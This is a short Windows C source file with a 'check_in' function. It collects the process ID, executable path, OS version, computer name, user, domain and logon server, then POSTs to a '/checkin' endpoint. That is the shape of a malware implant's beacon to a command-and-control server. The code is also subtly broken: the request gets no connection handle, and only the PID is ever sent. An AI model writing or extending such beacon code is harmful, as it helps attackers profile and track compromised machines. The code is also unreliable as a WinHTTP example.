#include <windows.h>
#include <winhttp.h>

void check_in(void) {
    DWORD pid = GetCurrentProcessId();
    WCHAR image[MAX_PATH], computer[MAX_COMPUTERNAME_LENGTH + 1];
    WCHAR user[256], domain[256], logon_server[256];
    DWORD image_size = MAX_PATH, computer_size = MAX_COMPUTERNAME_LENGTH + 1;
    DWORD user_size = 256, domain_size = 256;
    OSVERSIONINFOW version = { sizeof(version) };

    GetModuleFileNameW(NULL, image, image_size);
    GetVersionExW(&version);
    GetComputerNameW(computer, &computer_size);
    GetUserNameW(user, &user_size);
    GetEnvironmentVariableW(L"USERDOMAIN", domain, domain_size);
    GetEnvironmentVariableW(L"LOGONSERVER", logon_server, domain_size);

    HINTERNET request = WinHttpOpenRequest(NULL, L"POST", L"/checkin", NULL,
                                           WINHTTP_NO_REFERER,
                                           WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                       &pid, sizeof(pid), sizeof(pid), 0);
}
